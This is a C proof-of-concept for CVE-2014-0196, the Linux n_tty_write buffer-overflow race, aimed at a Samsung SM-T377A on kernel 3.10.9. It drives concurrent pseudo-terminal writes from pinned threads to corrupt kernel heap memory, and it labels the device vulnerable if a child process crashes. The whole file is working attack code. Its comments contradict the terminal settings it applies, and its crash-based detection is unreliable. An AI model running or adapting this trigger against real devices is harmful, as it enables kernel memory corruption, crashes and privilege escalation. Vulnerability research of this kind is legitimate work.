/*
 * ntty_race.c - CVE-2014-0196 n_tty_write buffer overflow race
 * Samsung SM-T377A, kernel 3.10.9
 *
 * CRITICAL: Must use COOKED mode (not raw!) for the n_tty output
 * buffer to be active. Raw mode bypasses the vulnerable code path.
 *
 * The race: two threads call n_tty_write concurrently. Due to a
 * race in buffer space checking, both can write past the end of
 * n_tty_data->buf (4096 bytes), corrupting adjacent kernel heap.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <sched.h>

static volatile int stop_race = 0;
static int slave_fd = -1;
static volatile long total_writes = 0;

static void *writer_thread(void *arg) {
    int id = (int)(long)arg;
    char buf[4096];
    long count = 0;
    
    /* Fill with pattern — different per thread */
    memset(buf, 'A' + (id % 26), sizeof(buf));
    
    /* Pin to specific CPU */
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(id % 2, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    
    while (!stop_race) {
        /* Write large chunks to maximize race window */
        ssize_t ret = write(slave_fd, buf, sizeof(buf));
        if (ret > 0) count++;
        else if (ret < 0 && errno != EAGAIN && errno != EINTR) break;
        /* Don't yield — keep pressure on */
    }
    
    __sync_fetch_and_add(&total_writes, count);
    return NULL;
}

static int run_race(int duration_secs) {
    int master, sn;
    char spath[64];
    
    master = open("/dev/ptmx", O_RDWR | O_NONBLOCK);
    if (master < 0) { perror("ptmx"); return -1; }
    
    int unlock = 0;
    ioctl(master, TIOCSPTLCK, &unlock);
    ioctl(master, TIOCGPTN, &sn);
    snprintf(spath, sizeof(spath), "/dev/pts/%d", sn);
    
    slave_fd = open(spath, O_RDWR);
    if (slave_fd < 0) { perror("slave"); close(master); return -1; }
    
    /* CRITICAL: Use COOKED mode (default) — NOT raw mode!
     * In cooked mode, n_tty processes output through its internal buffer
     * which is where the race condition exists.
     * We enable OPOST (output processing) which forces data through n_tty_write's
     * output buffer path. */
    struct termios tios;
    tcgetattr(slave_fd, &tios);
    tios.c_oflag |= OPOST;    /* Enable output processing */
    tios.c_oflag |= ONLCR;    /* Map NL to CR-NL — forces buffer use */
    tios.c_lflag &= ~ECHO;    /* No echo */
    tios.c_lflag &= ~ICANON;  /* Non-canonical but with OPOST */
    tcsetattr(slave_fd, TCSANOW, &tios);
    
    printf("  master=%d slave=%s (cooked output mode)\n", master, spath);
    
    stop_race = 0;
    total_writes = 0;
    
    /* Start writer threads */
    int nthreads = 4;
    pthread_t threads[4];
    for (int i = 0; i < nthreads; i++)
        pthread_create(&threads[i], NULL, writer_thread, (void *)(long)i);
    
    /* Drain master to prevent blocking */
    char drain[65536];
    int elapsed = 0;
    while (elapsed < duration_secs * 10) {
        usleep(100000); /* 100ms */
        int n = read(master, drain, sizeof(drain));
        (void)n;
        elapsed++;
    }
    
    stop_race = 1;
    for (int i = 0; i < nthreads; i++)
        pthread_join(threads[i], NULL);
    
    close(slave_fd);
    close(master);
    
    printf("  Total writes: %ld\n", total_writes);
    return 0;
}

int main(void) {
    printf("=== CVE-2014-0196 n_tty Write Race Test ===\n");
    printf("UID=%d\n\n", getuid());
    
    /* Run multiple rounds with increasing duration */
    int durations[] = {3, 5, 10};
    
    for (int d = 0; d < 3; d++) {
        printf("Round %d (%d seconds):\n", d+1, durations[d]);
        
        pid_t pid = fork();
        if (pid == 0) {
            int ret = run_race(durations[d]);
            _exit(ret < 0 ? 1 : 0);
        }
        
        int status;
        waitpid(pid, &status, 0);
        
        if (WIFSIGNALED(status)) {
            printf("  *** CRASHED signal=%d — VULNERABLE! ***\n", WTERMSIG(status));
            printf("  CVE-2014-0196 is present on this kernel!\n");
            return 0;
        }
        printf("  Survived\n\n");
    }
    
    printf("No crash after 3 rounds — likely patched\n");
    return 0;
}
